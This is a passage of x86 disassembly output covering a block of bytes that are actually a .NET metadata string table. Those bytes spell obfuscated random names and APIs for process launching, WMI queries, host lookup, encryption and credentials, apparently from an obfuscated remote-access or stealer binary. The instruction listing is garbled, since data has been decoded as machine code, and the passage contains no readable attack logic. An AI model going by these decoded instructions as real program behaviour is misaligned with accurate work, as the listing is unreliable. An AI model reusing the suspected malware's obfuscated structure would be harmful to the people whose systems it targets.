  408eb8:	47                   	inc    %edi
  408eb9:	62 72 75             	bound  %esi,0x75(%edx)
  408ebc:	4b                   	dec    %ebx
  408ebd:	57                   	push   %edi
  408ebe:	77 79                	ja     0x408f39
  408ec0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ec1:	00 61 4f             	add    %ah,0x4f(%ecx)
  408ec4:	79 74                	jns    0x408f3a
  408ec6:	68 59 70 4c 50       	push   $0x504c7059
  408ecb:	53                   	push   %ebx
  408ecc:	43                   	inc    %ebx
  408ecd:	6f                   	outsl  %ds:(%esi),(%dx)
  408ece:	00 43 68             	add    %al,0x68(%ebx)
  408ed1:	4d                   	dec    %ebp
  408ed2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ed3:	4b                   	dec    %ebx
  408ed4:	6f                   	outsl  %ds:(%esi),(%dx)
  408ed5:	5a                   	pop    %edx
  408ed6:	78 71                	js     0x408f49
  408ed8:	44                   	inc    %esp
  408ed9:	55                   	push   %ebp
  408eda:	6f                   	outsl  %ds:(%esi),(%dx)
  408edb:	00 4d 5a             	add    %cl,0x5a(%ebp)
  408ede:	4e                   	dec    %esi
  408edf:	78 79                	js     0x408f5a
  408ee1:	58                   	pop    %eax
  408ee2:	42                   	inc    %edx
  408ee3:	4b                   	dec    %ebx
  408ee4:	48                   	dec    %eax
  408ee5:	57                   	push   %edi
  408ee6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ee7:	00 64 73 76          	add    %ah,0x76(%ebx,%esi,2)
  408eeb:	55                   	push   %ebp
  408eec:	6a 50                	push   $0x50
  408eee:	42                   	inc    %edx
  408eef:	68 48 46 66 6f       	push   $0x6f664648
  408ef4:	00 49 6d             	add    %cl,0x6d(%ecx)
  408ef7:	61                   	popa
  408ef8:	67 65 43             	addr16 gs inc %ebx
  408efb:	6f                   	outsl  %ds:(%esi),(%dx)
  408efc:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408f01:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f03:	00 46 69             	add    %al,0x69(%esi)
  408f06:	6c                   	insb   (%dx),%es:(%edi)
  408f07:	65 49                	gs dec %ecx
  408f09:	6e                   	outsb  %ds:(%esi),(%dx)
  408f0a:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f0c:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408f10:	76 65                	jbe    0x408f77
  408f12:	49                   	dec    %ecx
  408f13:	6e                   	outsb  %ds:(%esi),(%dx)
  408f14:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f16:	00 46 69             	add    %al,0x69(%esi)
  408f19:	6c                   	insb   (%dx),%es:(%edi)
  408f1a:	65 53                	gs push %ebx
  408f1c:	79 73                	jns    0x408f91
  408f1e:	74 65                	je     0x408f85
  408f20:	6d                   	insl   (%dx),%es:(%edi)
  408f21:	49                   	dec    %ecx
  408f22:	6e                   	outsb  %ds:(%esi),(%dx)
  408f23:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f25:	00 43 6f             	add    %al,0x6f(%ebx)
  408f28:	6d                   	insl   (%dx),%es:(%edi)
  408f29:	70 75                	jo     0x408fa0
  408f2b:	74 65                	je     0x408f92
  408f2d:	72 49                	jb     0x408f78
  408f2f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f30:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f32:	00 43 53             	add    %al,0x53(%ebx)
  408f35:	68 61 72 70 41       	push   $0x41707261
  408f3a:	72 67                	jb     0x408fa3
  408f3c:	75 6d                	jne    0x408fab
  408f3e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f40:	74 49                	je     0x408f8b
  408f42:	6e                   	outsb  %ds:(%esi),(%dx)
  408f43:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f45:	00 73 65             	add    %dh,0x65(%ebx)
  408f48:	74 5f                	je     0x408fa9
  408f4a:	53                   	push   %ebx
  408f4b:	74 61                	je     0x408fae
  408f4d:	72 74                	jb     0x408fc3
  408f4f:	49                   	dec    %ecx
  408f50:	6e                   	outsb  %ds:(%esi),(%dx)
  408f51:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f53:	00 50 72             	add    %dl,0x72(%eax)
  408f56:	6f                   	outsl  %ds:(%esi),(%dx)
  408f57:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f5a:	73 53                	jae    0x408faf
  408f5c:	74 61                	je     0x408fbf
  408f5e:	72 74                	jb     0x408fd4
  408f60:	49                   	dec    %ecx
  408f61:	6e                   	outsb  %ds:(%esi),(%dx)
  408f62:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f64:	00 6e 78             	add    %ch,0x78(%esi)
  408f67:	6f                   	outsl  %ds:(%esi),(%dx)
  408f68:	45                   	inc    %ebp
  408f69:	42                   	inc    %edx
  408f6a:	44                   	inc    %esp
  408f6b:	6c                   	insb   (%dx),%es:(%edi)
  408f6c:	73 79                	jae    0x408fe7
  408f6e:	46                   	inc    %esi
  408f6f:	55                   	push   %ebp
  408f70:	41                   	inc    %ecx
  408f71:	45                   	inc    %ebp
  408f72:	6b 6f 00 64          	imul   $0x64,0x0(%edi),%ebp
  408f76:	78 54                	js     0x408fcc
  408f78:	67 6d                	insl   (%dx),%es:(%di)
  408f7a:	4c                   	dec    %esp
  408f7b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f7c:	72 75                	jb     0x408ff3
  408f7e:	64 46                	fs inc %esi
  408f80:	43                   	inc    %ebx
  408f81:	63 58 70             	arpl   %ebx,0x70(%eax)
  408f84:	00 6b 55             	add    %ch,0x55(%ebx)
  408f87:	61                   	popa
  408f88:	43                   	inc    %ebx
  408f89:	46                   	inc    %esi
  408f8a:	75 75                	jne    0x409001
  408f8c:	6c                   	insb   (%dx),%es:(%edi)
  408f8d:	69 70 63 70 00 53 6c 	imul   $0x6c530070,0x63(%eax),%esi
  408f94:	65 65 70 00          	gs gs jo 0x408f98
  408f98:	69 51 57 65 79 4b 57 	imul   $0x574b7965,0x57(%ecx),%edx
  408f9f:	53                   	push   %ebx
  408fa0:	64 44                	fs inc %esp
  408fa2:	66 70 00             	data16 jo 0x408fa5
  408fa5:	4d                   	dec    %ebp
  408fa6:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408fad:	74 2e                	je     0x408fdd
  408faf:	43                   	inc    %ebx
  408fb0:	53                   	push   %ebx
  408fb1:	68 61 72 70 00       	push   $0x707261
  408fb6:	6c                   	insb   (%dx),%es:(%edi)
  408fb7:	64 61                	fs popa
  408fb9:	6e                   	outsb  %ds:(%esi),(%dx)
  408fba:	78 53                	js     0x40900f
  408fbc:	45                   	inc    %ebp
  408fbd:	72 57                	jb     0x409016
  408fbf:	62 56 77             	bound  %edx,0x77(%esi)
  408fc2:	70 00                	jo     0x408fc4
  408fc4:	77 77                	ja     0x40903d
  408fc6:	56                   	push   %esi
  408fc7:	6a 77                	push   $0x77
  408fc9:	58                   	pop    %eax
  408fca:	6a 58                	push   $0x58
  408fcc:	48                   	dec    %eax
  408fcd:	41                   	inc    %ecx
  408fce:	71 00                	jno    0x408fd0
  408fd0:	4e                   	dec    %esi
  408fd1:	59                   	pop    %ecx
  408fd2:	42                   	inc    %edx
  408fd3:	55                   	push   %ebp
  408fd4:	67 56                	addr16 push %esi
  408fd6:	4f                   	dec    %edi
  408fd7:	67 7a 49             	addr16 jp 0x409023
  408fda:	71 00                	jno    0x408fdc
  408fdc:	55                   	push   %ebp
  408fdd:	4f                   	dec    %edi
  408fde:	6b 79 4a 70          	imul   $0x70,0x4a(%ecx),%edi
  408fe2:	67 76 61             	addr16 jbe 0x409046
  408fe5:	71 00                	jno    0x408fe7
  408fe7:	48                   	dec    %eax
  408fe8:	70 6e                	jo     0x409058
  408fea:	65 41                	gs inc %ecx
  408fec:	5a                   	pop    %edx
  408fed:	74 56                	je     0x409045
  408fef:	66 5a                	pop    %dx
  408ff1:	74 64                	je     0x409057
  408ff3:	71 00                	jno    0x408ff5
  408ff5:	53                   	push   %ebx
  408ff6:	79 73                	jns    0x40906b
  408ff8:	74 65                	je     0x40905f
  408ffa:	6d                   	insl   (%dx),%es:(%edi)
  408ffb:	2e 4c                	cs dec %esp
  408ffd:	69 6e 71 00 73 71 6e 	imul   $0x6e717300,0x71(%esi),%ebp
  409004:	50                   	push   %eax
  409005:	4a                   	dec    %edx
  409006:	6e                   	outsb  %ds:(%esi),(%dx)
  409007:	53                   	push   %ebx
  409008:	45                   	inc    %ebp
  409009:	48                   	dec    %eax
  40900a:	67 41                	addr16 inc %ecx
  40900c:	71 71                	jno    0x40907f
  40900e:	00 64 67 4d          	add    %ah,0x4d(%edi,%eiz,2)
  409012:	59                   	pop    %ecx
  409013:	70 71                	jo     0x409086
  409015:	65 74 45             	gs je  0x40905d
  409018:	4b                   	dec    %ebx
  409019:	52                   	push   %edx
  40901a:	6d                   	insl   (%dx),%es:(%edi)
  40901b:	55                   	push   %ebp
  40901c:	71 71                	jno    0x40908f
  40901e:	00 44 7a 55          	add    %al,0x55(%edx,%edi,2)
  409022:	50                   	push   %eax
  409023:	68 75 75 41 58       	push   $0x58417575
  409028:	72 00                	jb     0x40902a
  40902a:	43                   	inc    %ebx
  40902b:	6c                   	insb   (%dx),%es:(%edi)
  40902c:	65 61                	gs popa
  40902e:	72 00                	jb     0x409030
  409030:	43                   	inc    %ebx
  409031:	68 61 72 00 49       	push   $0x49007261
  409036:	6e                   	outsb  %ds:(%esi),(%dx)
  409037:	76 6f                	jbe    0x4090a8
  409039:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40903d:	6d                   	insl   (%dx),%es:(%edi)
  40903e:	62 65 72             	bound  %esp,0x72(%ebp)
  409041:	00 4d 44             	add    %cl,0x44(%ebp)
  409044:	35 43 72 79 70       	xor    $0x70797243,%eax
  409049:	74 6f                	je     0x4090ba
  40904b:	53                   	push   %ebx
  40904c:	65 72 76             	gs jb  0x4090c5
  40904f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409056:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  40905d:	41 
  40905e:	43                   	inc    %ebx
  40905f:	72 79                	jb     0x4090da
  409061:	70 74                	jo     0x4090d7
  409063:	6f                   	outsl  %ds:(%esi),(%dx)
  409064:	53                   	push   %ebx
  409065:	65 72 76             	gs jb  0x4090de
  409068:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40906f:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  409076:	73 
  409077:	43                   	inc    %ebx
  409078:	72 79                	jb     0x4090f3
  40907a:	70 74                	jo     0x4090f0
  40907c:	6f                   	outsl  %ds:(%esi),(%dx)
  40907d:	53                   	push   %ebx
  40907e:	65 72 76             	gs jb  0x4090f7
  409081:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409088:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  40908f:	72 
  409090:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  409097:	64 65 72 00          	fs gs jb 0x40909b
  40909b:	4d                   	dec    %ebp
  40909c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4090a3:	74 2e                	je     0x4090d3
  4090a5:	43                   	inc    %ebx
  4090a6:	53                   	push   %ebx
  4090a7:	68 61 72 70 2e       	push   $0x2e707261
  4090ac:	52                   	push   %edx
  4090ad:	75 6e                	jne    0x40911d
  4090af:	74 69                	je     0x40911a
  4090b1:	6d                   	insl   (%dx),%es:(%edi)
  4090b2:	65 42                	gs inc %edx
  4090b4:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4090bb:	61                   	popa
  4090bc:	6c                   	insb   (%dx),%es:(%edi)
  4090bd:	6c                   	insb   (%dx),%es:(%edi)
  4090be:	53                   	push   %ebx
  4090bf:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4090c6:	65 
  4090c7:	72 00                	jb     0x4090c9
  4090c9:	67 65 74 5f          	addr16 gs je 0x40912c
  4090cd:	42                   	inc    %edx
  4090ce:	75 66                	jne    0x409136
  4090d0:	66 65 72 00          	data16 gs jb 0x4090d4
  4090d4:	73 65                	jae    0x40913b
  4090d6:	74 5f                	je     0x409137
  4090d8:	42                   	inc    %edx
  4090d9:	75 66                	jne    0x409141
  4090db:	66 65 72 00          	data16 gs jb 0x4090df
  4090df:	67 65 74 5f          	addr16 gs je 0x409142
  4090e3:	41                   	inc    %ecx
  4090e4:	73 49                	jae    0x40912f
  4090e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e7:	74 65                	je     0x40914e
  4090e9:	67 65 72 00          	addr16 gs jb 0x4090ed
  4090ed:	73 65                	jae    0x409154
  4090ef:	74 5f                	je     0x409150
  4090f1:	41                   	inc    %ecx
  4090f2:	73 49                	jae    0x40913d
  4090f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f5:	74 65                	je     0x40915c
  4090f7:	67 65 72 00          	addr16 gs jb 0x4090fb
  4090fb:	4d                   	dec    %ebp
  4090fc:	61                   	popa
  4090fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4090fe:	61                   	popa
  4090ff:	67 65 6d             	gs insl (%dx),%es:(%di)
  409102:	65 6e                	outsb  %gs:(%esi),(%dx)
  409104:	74 4f                	je     0x409155
  409106:	62 6a 65             	bound  %ebp,0x65(%edx)
  409109:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40910d:	61                   	popa
  40910e:	72 63                	jb     0x409173
  409110:	68 65 72 00 53       	push   $0x53007265
  409115:	65 73 73             	gs jae 0x40918b
  409118:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40911f:	6e                   	outsb  %ds:(%esi),(%dx)
  409120:	67 45                	addr16 inc %ebp
  409122:	76 65                	jbe    0x409189
  409124:	6e                   	outsb  %ds:(%esi),(%dx)
  409125:	74 48                	je     0x40916f
  409127:	61                   	popa
  409128:	6e                   	outsb  %ds:(%esi),(%dx)
  409129:	64 6c                	fs insb (%dx),%es:(%edi)
  40912b:	65 72 00             	gs jb  0x40912e
  40912e:	54                   	push   %esp
  40912f:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409136:	55                   	push   %ebp
  409137:	70 70                	jo     0x4091a9
  409139:	65 72 00             	gs jb  0x40913c
  40913c:	43                   	inc    %ebx
  40913d:	75 72                	jne    0x4091b1
  40913f:	72 65                	jb     0x4091a6
  409141:	6e                   	outsb  %ds:(%esi),(%dx)
  409142:	74 55                	je     0x409199
  409144:	73 65                	jae    0x4091ab
  409146:	72 00                	jb     0x409148
  409148:	53                   	push   %ebx
  409149:	74 72                	je     0x4091bd
  40914b:	65 61                	gs popa
  40914d:	6d                   	insl   (%dx),%es:(%edi)
  40914e:	57                   	push   %edi
  40914f:	72 69                	jb     0x4091ba
  409151:	74 65                	je     0x4091b8
  409153:	72 00                	jb     0x409155
  409155:	54                   	push   %esp
  409156:	65 78 74             	gs js  0x4091cd
  409159:	57                   	push   %edi
  40915a:	72 69                	jb     0x4091c5
  40915c:	74 65                	je     0x4091c3
  40915e:	72 00                	jb     0x409160
  409160:	45                   	inc    %ebp
  409161:	6e                   	outsb  %ds:(%esi),(%dx)
  409162:	74 65                	je     0x4091c9
  409164:	72 00                	jb     0x409166
  409166:	42                   	inc    %edx
  409167:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40916e:	72 
  40916f:	74 65                	je     0x4091d6
  409171:	72 00                	jb     0x409173
  409173:	54                   	push   %esp
  409174:	6f                   	outsl  %ds:(%esi),(%dx)
  409175:	4c                   	dec    %esp
  409176:	6f                   	outsl  %ds:(%esi),(%dx)
  409177:	77 65                	ja     0x4091de
  409179:	72 00                	jb     0x40917b
  40917b:	49                   	dec    %ecx
  40917c:	45                   	inc    %ebp
  40917d:	6e                   	outsb  %ds:(%esi),(%dx)
  40917e:	75 6d                	jne    0x4091ed
  409180:	65 72 61             	gs jb  0x4091e4
  409183:	74 6f                	je     0x4091f4
  409185:	72 00                	jb     0x409187
  409187:	4d                   	dec    %ebp
  409188:	61                   	popa
  409189:	6e                   	outsb  %ds:(%esi),(%dx)
  40918a:	61                   	popa
  40918b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40918e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409190:	74 4f                	je     0x4091e1
  409192:	62 6a 65             	bound  %ebp,0x65(%edx)
  409195:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  409199:	75 6d                	jne    0x409208
  40919b:	65 72 61             	gs jb  0x4091ff
  40919e:	74 6f                	je     0x40920f
  4091a0:	72 00                	jb     0x4091a2
  4091a2:	53                   	push   %ebx
  4091a3:	79 73                	jns    0x409218
  4091a5:	74 65                	je     0x40920c
  4091a7:	6d                   	insl   (%dx),%es:(%edi)
  4091a8:	2e 43                	cs inc %ebx
  4091aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ab:	6c                   	insb   (%dx),%es:(%edi)
  4091ac:	6c                   	insb   (%dx),%es:(%edi)
  4091ad:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b3:	73 2e                	jae    0x4091e3
  4091b5:	49                   	dec    %ecx
  4091b6:	45                   	inc    %ebp
  4091b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b8:	75 6d                	jne    0x409227
  4091ba:	65 72 61             	gs jb  0x40921e
  4091bd:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  4091c1:	47                   	inc    %edi
  4091c2:	65 74 45             	gs je  0x40920a
  4091c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4091c6:	75 6d                	jne    0x409235
  4091c8:	65 72 61             	gs jb  0x40922c
  4091cb:	74 6f                	je     0x40923c
  4091cd:	72 00                	jb     0x4091cf
  4091cf:	41                   	inc    %ecx
  4091d0:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4091d4:	61                   	popa
  4091d5:	74 6f                	je     0x409246
  4091d7:	72 00                	jb     0x4091d9
  4091d9:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4091de:	00 2e                	add    %ch,(%esi)
  4091e0:	63 63 74             	arpl   %esp,0x74(%ebx)
  4091e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e4:	72 00                	jb     0x4091e6
  4091e6:	4d                   	dec    %ebp
  4091e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e9:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  4091f0:	65 
  4091f1:	61                   	popa
  4091f2:	74 65                	je     0x409259
  4091f4:	44                   	inc    %esp
  4091f5:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4091f9:	70 74                	jo     0x40926f
  4091fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4091fc:	72 00                	jb     0x4091fe
  4091fe:	43                   	inc    %ebx
  4091ff:	72 65                	jb     0x409266
  409201:	61                   	popa
  409202:	74 65                	je     0x409269
  409204:	45                   	inc    %ebp
  409205:	6e                   	outsb  %ds:(%esi),(%dx)
  409206:	63 72 79             	arpl   %esi,0x79(%edx)
  409209:	70 74                	jo     0x40927f
  40920b:	6f                   	outsl  %ds:(%esi),(%dx)
  40920c:	72 00                	jb     0x40920e
  40920e:	76 66                	jbe    0x409276
  409210:	74 51                	je     0x409263
  409212:	43                   	inc    %ebx
  409213:	53                   	push   %ebx
  409214:	46                   	inc    %esi
  409215:	77 51                	ja     0x409268
  409217:	51                   	push   %ecx
  409218:	46                   	inc    %esi
  409219:	71 43                	jno    0x40925e
  40921b:	73 72                	jae    0x40928f
  40921d:	00 49 6e             	add    %cl,0x6e(%ecx)
  409220:	74 50                	je     0x409272
  409222:	74 72                	je     0x409296
  409224:	00 50 7a             	add    %dl,0x7a(%eax)
  409227:	54                   	push   %esp
  409228:	4e                   	dec    %esi
  409229:	73 6a                	jae    0x409295
  40922b:	6f                   	outsl  %ds:(%esi),(%dx)
  40922c:	6f                   	outsl  %ds:(%esi),(%dx)
  40922d:	70 65                	jo     0x409294
  40922f:	47                   	inc    %edi
  409230:	73 00                	jae    0x409232
  409232:	44                   	inc    %esp
  409233:	56                   	push   %esi
  409234:	43                   	inc    %ebx
  409235:	6e                   	outsb  %ds:(%esi),(%dx)
  409236:	4d                   	dec    %ebp
  409237:	51                   	push   %ecx
  409238:	53                   	push   %ebx
  409239:	4d                   	dec    %ebp
  40923a:	58                   	pop    %eax
  40923b:	57                   	push   %edi
  40923c:	62 4b 4a             	bound  %ecx,0x4a(%ebx)
  40923f:	73 00                	jae    0x409241
  409241:	48                   	dec    %eax
  409242:	4b                   	dec    %ebx
  409243:	4c                   	dec    %esp
  409244:	5a                   	pop    %edx
  409245:	4d                   	dec    %ebp
  409246:	6d                   	insl   (%dx),%es:(%edi)
  409247:	69 68 53 76 51 4c 71 	imul   $0x714c5176,0x53(%eax),%ebp
  40924e:	46                   	inc    %esi
  40924f:	4c                   	dec    %esp
  409250:	73 00                	jae    0x409252
  409252:	53                   	push   %ebx
  409253:	79 73                	jns    0x4092c8
  409255:	74 65                	je     0x4092bc
  409257:	6d                   	insl   (%dx),%es:(%edi)
  409258:	2e 44                	cs inc %esp
  40925a:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  409261:	69 63 73 00 74 74 53 	imul   $0x53747400,0x73(%ebx),%esp
  409268:	56                   	push   %esi
  409269:	4f                   	dec    %edi
  40926a:	63 4f 73             	arpl   %ecx,0x73(%edi)
  40926d:	65 66 4b             	gs dec %bx
  409270:	70 48                	jo     0x4092ba
  409272:	65 73 00             	gs jae 0x409275
  409275:	4d                   	dec    %ebp
  409276:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40927d:	74 2e                	je     0x4092ad
  40927f:	56                   	push   %esi
  409280:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  409287:	73 69                	jae    0x4092f2
  409289:	63 2e                	arpl   %ebp,(%esi)
  40928b:	44                   	inc    %esp
  40928c:	65 76 69             	gs jbe 0x4092f8
  40928f:	63 65 73             	arpl   %esp,0x73(%ebp)
  409292:	00 53 79             	add    %dl,0x79(%ebx)
  409295:	73 74                	jae    0x40930b
  409297:	65 6d                	gs insl (%dx),%es:(%edi)
  409299:	2e 52                	cs push %edx
  40929b:	75 6e                	jne    0x40930b
  40929d:	74 69                	je     0x409308
  40929f:	6d                   	insl   (%dx),%es:(%edi)
  4092a0:	65 2e 49             	gs cs dec %ecx
  4092a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a4:	74 65                	je     0x40930b
  4092a6:	72 6f                	jb     0x409317
  4092a8:	70 53                	jo     0x4092fd
  4092aa:	65 72 76             	gs jb  0x409323
  4092ad:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4092b4:	73 74                	jae    0x40932a
  4092b6:	65 6d                	gs insl (%dx),%es:(%edi)
  4092b8:	2e 52                	cs push %edx
  4092ba:	75 6e                	jne    0x40932a
  4092bc:	74 69                	je     0x409327
  4092be:	6d                   	insl   (%dx),%es:(%edi)
  4092bf:	65 2e 43             	gs cs inc %ebx
  4092c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c3:	6d                   	insl   (%dx),%es:(%edi)
  4092c4:	70 69                	jo     0x40932f
  4092c6:	6c                   	insb   (%dx),%es:(%edi)
  4092c7:	65 72 53             	gs jb  0x40931d
  4092ca:	65 72 76             	gs jb  0x409343
  4092cd:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4092d4:	62 75 67             	bound  %esi,0x67(%ebp)
  4092d7:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4092de:	65 
  4092df:	73 00                	jae    0x4092e1
  4092e1:	45                   	inc    %ebp
  4092e2:	78 70                	js     0x409354
  4092e4:	61                   	popa
  4092e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e6:	64 45                	fs inc %ebp
  4092e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e9:	76 69                	jbe    0x409354
  4092eb:	72 6f                	jb     0x40935c
  4092ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ee:	6d                   	insl   (%dx),%es:(%edi)
  4092ef:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092f1:	74 56                	je     0x409349
  4092f3:	61                   	popa
  4092f4:	72 69                	jb     0x40935f
  4092f6:	61                   	popa
  4092f7:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  4092fb:	00 47 65             	add    %al,0x65(%edi)
  4092fe:	74 50                	je     0x409350
  409300:	72 6f                	jb     0x409371
  409302:	63 65 73             	arpl   %esp,0x73(%ebp)
  409305:	73 65                	jae    0x40936c
  409307:	73 00                	jae    0x409309
  409309:	47                   	inc    %edi
  40930a:	65 74 48             	gs je  0x409355
  40930d:	6f                   	outsl  %ds:(%esi),(%dx)
  40930e:	73 74                	jae    0x409384
  409310:	41                   	inc    %ecx
  409311:	64 64 72 65          	fs fs jb 0x40937a
  409315:	73 73                	jae    0x40938a
  409317:	65 73 00             	gs jae 0x40931a
  40931a:	53                   	push   %ebx
  40931b:	79 73                	jns    0x409390
  40931d:	74 65                	je     0x409384
  40931f:	6d                   	insl   (%dx),%es:(%edi)
  409320:	2e 53                	cs push %ebx
  409322:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409326:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40932d:	70 
  40932e:	74 6f                	je     0x40939f
  409330:	67 72 61             	addr16 jb 0x409394
  409333:	70 68                	jo     0x40939d
  409335:	79 2e                	jns    0x409365
  409337:	58                   	pop    %eax
  409338:	35 30 39 43 65       	xor    $0x65433930,%eax
  40933d:	72 74                	jb     0x4093b3
  40933f:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409346:	73 00                	jae    0x409348
  409348:	52                   	push   %edx
  409349:	66 63 32             	arpl   %si,(%edx)
  40934c:	38 39                	cmp    %bh,(%ecx)
  40934e:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  409352:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  409359:	73 00                	jae    0x40935b
  40935b:	52                   	push   %edx
  40935c:	65 61                	gs popa
  40935e:	64 41                	fs inc %ecx
  409360:	6c                   	insb   (%dx),%es:(%edi)
  409361:	6c                   	insb   (%dx),%es:(%edi)
  409362:	42                   	inc    %edx
  409363:	79 74                	jns    0x4093d9
  409365:	65 73 00             	gs jae 0x409368
  409368:	47                   	inc    %edi
  409369:	65 74 42             	gs je  0x4093ae
  40936c:	79 74                	jns    0x4093e2
  40936e:	65 73 00             	gs jae 0x409371
  409371:	4e                   	dec    %esi
  409372:	65 78 74             	gs js  0x4093e9
  409375:	42                   	inc    %edx
  409376:	79 74                	jns    0x4093ec
  409378:	65 73 00             	gs jae 0x40937b
  40937b:	43                   	inc    %ebx
  40937c:	53                   	push   %ebx
  40937d:	68 61 72 70 41       	push   $0x41707261
  409382:	72 67                	jb     0x4093eb
  409384:	75 6d                	jne    0x4093f3
  409386:	65 6e                	outsb  %gs:(%esi),(%dx)
  409388:	74 49                	je     0x4093d3
  40938a:	6e                   	outsb  %ds:(%esi),(%dx)
  40938b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40938d:	46                   	inc    %esi
  40938e:	6c                   	insb   (%dx),%es:(%edi)
  40938f:	61                   	popa
  409390:	67 73 00             	addr16 jae 0x409393
  409393:	43                   	inc    %ebx
  409394:	53                   	push   %ebx
  409395:	68 61 72 70 42       	push   $0x42707261
  40939a:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4093a1:	61                   	popa
  4093a2:	67 73 00             	addr16 jae 0x4093a5
  4093a5:	53                   	push   %ebx
  4093a6:	74 72                	je     0x40941a
  4093a8:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4093af:	73 73                	jae    0x409424
  4093b1:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4093b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b9:	67 45                	addr16 inc %ebp
  4093bb:	76 65                	jbe    0x409422
  4093bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4093be:	74 41                	je     0x409401
  4093c0:	72 67                	jb     0x409429
  4093c2:	73 00                	jae    0x4093c4
  4093c4:	6d                   	insl   (%dx),%es:(%edi)
  4093c5:	51                   	push   %ecx
  4093c6:	4b                   	dec    %ebx
  4093c7:	66 4a                	dec    %dx
  4093c9:	73 45                	jae    0x409410
  4093cb:	68 50 49 6d 6a       	push   $0x6a6d4950
  4093d0:	73 00                	jae    0x4093d2
  4093d2:	49                   	dec    %ecx
  4093d3:	43                   	inc    %ebx
  4093d4:	72 65                	jb     0x40943b
  4093d6:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4093d9:	74 69                	je     0x409444
  4093db:	61                   	popa
  4093dc:	6c                   	insb   (%dx),%es:(%edi)
  4093dd:	73 00                	jae    0x4093df
  4093df:	73 65                	jae    0x409446
